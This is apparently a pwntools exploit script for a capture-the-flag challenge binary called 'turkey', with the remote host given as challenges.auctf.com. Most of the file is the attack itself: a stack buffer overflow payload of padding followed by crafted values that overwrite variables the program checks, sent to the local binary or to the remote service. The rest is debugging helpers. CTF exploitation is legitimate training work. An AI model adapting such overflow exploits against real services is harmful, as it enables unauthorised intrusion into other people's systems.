from pwn import *
  
BINARY = './turkey'
LIBC = './libc.so.6'
HOST = 'challenges.auctf.com'
PORT = 30011

elf = ELF(BINARY)
#libc = ELF('./libc.so.6')

context.terminal = ['tmux', 'split-w']


def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

p = start()
if args.GDB:
    gdb.attach(p, 'b fgets')

print(p.recvuntil("I got!\n"))
exploit = 'A'*16 + '\x2a\x00\x00\x00' + '\x15\x00\x00\x00'+ '\x63\x74\x66\x00' + '\xeb\xff\xff\xff' + '\x37\x13\x00\x00'
p.sendline(exploit)
print(p.recvline())
print(p.recvline())
print(p.recvline())

